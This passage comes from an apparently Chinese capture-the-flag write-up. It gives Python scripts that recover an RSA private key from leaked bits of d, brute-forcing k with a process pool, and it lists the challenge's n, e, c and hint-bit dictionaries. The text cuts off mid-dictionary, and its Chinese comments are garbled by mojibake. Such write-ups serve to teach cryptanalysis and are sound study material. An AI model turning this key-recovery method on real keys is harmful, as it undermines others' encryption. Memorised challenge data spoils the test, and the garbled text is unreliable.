class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="number">1</span>, l), <span class="built_in">min</span>(e, r)):</span><br><span class="line">        d_tilde = (k*(N+<span class="number">1</span>)+<span class="number">1</span>) // e</span><br><span class="line">        d_tilde_str = <span class="built_in">bin</span>(d_tilde)[<span class="number">2</span>:].zfill(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">for</span> x, y <span class="keyword">in</span> my_hint_d.items():</span><br><span class="line">            <span class="keyword">if</span> (d_tilde_str[x] != y):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;FIND ANS:&#x27;</span>, k)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># print(f&#x27;Find &#123;(l, r)&#125; failed&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testX = [(<span class="number">2</span>**<span class="number">24</span>*i, <span class="number">2</span>**<span class="number">24</span>*(i+<span class="number">1</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;concurrent:&#x27;</span>)  <span class="comment"># åˆ›å»ºå¤šä¸ªè¿›ç¨‹ï¼Œå¹¶è¡Œæ‰§è¡Œ</span></span><br><span class="line">    pool = Pool(<span class="number">256</span>)  <span class="comment"># åˆ›å»ºæ‹¥æœ‰3ä¸ªè¿›ç¨‹æ•°é‡çš„è¿›ç¨‹æ± </span></span><br><span class="line">    </span><br><span class="line">    pool.<span class="built_in">map</span>(run, testX)</span><br><span class="line">    pool.close()  <span class="comment"># å…³é—­è¿›ç¨‹æ± ï¼Œä¸å†æ¥å—æ–°çš„è¿›ç¨‹</span></span><br><span class="line">    pool.join()  <span class="comment"># ä¸»è¿›ç¨‹é˜»å¡ç­‰å¾…å­è¿›ç¨‹çš„é€€å‡º</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°kä»¥åçˆ†ç ´pqï¼Œç›´æ¥ç”¨æ˜¥å“¥çš„ä»£ç </p><p><a href="https://zhuanlan.zhihu.com/p/266059082">https://zhuanlan.zhihu.com/p/266059082</a> ï¼Œå››å…ƒå˜ä¸‰å…ƒï¼Œä¹Ÿå¾ˆåƒç®—åŠ›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">73380160475470842653695210816683702314062827937540324056880543809752271506601290265975543542548117392788987830919581511428492717214125296973338501980504384307279414528799452106399062576988406269897425829853390463840834798274139351938197666753546672052277640048588091137812362810008344723302886421059831149393</span></span><br><span class="line">e = <span class="number">3116872133</span></span><br><span class="line">c = <span class="number">69574121902821459446683688068339366486115223765903849266663001038736496551168104587683366853482649748413400537793260948337629422998336301256862519087984048032673577462034223842650399943613576577927825123830629917138007035313624847266208032195071033675853881447717750353382112841885318776240405314057286867952</span></span><br><span class="line">hint1 = &#123;<span class="number">120</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">401</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">420</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">192</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">164</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">100</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">425</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">227</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">497</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">284</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">110</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">257</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">68</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">206</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">174</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">326</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">320</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">498</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">128</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">222</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">166</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">496</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">151</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">317</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">181</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">288</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">311</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">69</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">410</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">127</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">308</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">435</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">258</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">235</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">94</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">93</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">427</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">316</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">88</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">390</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">72</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">450</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">397</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">309</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">487</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">207</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">234</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">144</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">229</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">506</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">253</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">86</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">384</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">428</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">359</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">339</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">142</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">452</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">480</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">224</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">98</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">508</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">90</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">170</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">146</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">101</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">416</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">460</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">387</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">67</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">285</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">213</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">162</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">485</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">413</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">312</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">458</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">75</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">242</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">501</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">434</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">456</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">264</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">407</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">135</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">84</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">476</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">471</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">430</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">191</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">176</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">156</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">322</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">388</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">364</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">321</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">351</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">230</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">345</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">432</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">79</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">290</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">117</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">507</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">421</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">274</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">204</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">383</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">305</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">113</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">334</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">85</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">511</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">464</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">491</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">370</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">92</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">495</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">279</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">346</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">466</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">87</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">243</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">461</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">379</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">256</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">276</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">147</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">187</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">218</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">78</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">411</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">343</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">271</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">378</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">492</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">269</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">291</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">289</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">132</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">408</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">398</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">468</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">124</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">236</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">377</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">83</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line">hint2 = &#123;<span class="number">125</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">86</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">498</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">311</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">93</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">385</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">315</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">300</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">454</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">152</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">205</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">400</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">348</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">154</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">435</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">430</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">72</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">136</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">294</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">466</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">388</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">428</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">440</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">250</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">506</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">270</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">318</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">107</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">474</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">325</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">281</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">392</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">90</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">278</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">425</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">109</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">423</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">190</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">171</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">475</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">441</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">336</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">371</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">323</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">469</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">451</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">438</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">203</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">121</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">494</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">399</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">314</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">183</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">492</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">246</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">108</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">379</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">460</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">372</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">313</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">237</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">204</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">339</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">483</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">402</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">67</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">338</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">116</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">406</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">218</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">115</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">301</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">490</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">502</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">343</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">321</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">231</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">88</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">404</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">426</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">344</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">463</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">461</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">229</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">274</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">134</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">256</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">471</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">157</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">217</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">158</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">307</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">255</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">386</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">373</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">114</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">360</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">148</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">383</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">472</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">201</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">262</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">221</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">224</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">185</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">214</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">285</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">410</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">455</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">445</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">464</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">284</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">503</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">298</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">477</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">376</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">210</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">364</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">163</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">213</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">295</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">111</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">458</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">146</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">244</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">261</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">508</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">106</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">120</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">156</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">303</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">259</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">444</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">215</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">304</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">140</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">351</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">443</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line">hint3 = &#123;<span class="number">891</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">74</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">129</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">477</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">880</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">289</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">361</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1012</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">529</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">294</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">174</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">500</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">257</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">392</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">405</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">763</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">637</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">564</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">941</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">923</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1014</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">670</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">558</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">304</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">444</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">716</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">208</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">130</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">634</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">661</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">862</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">412</span>: <span 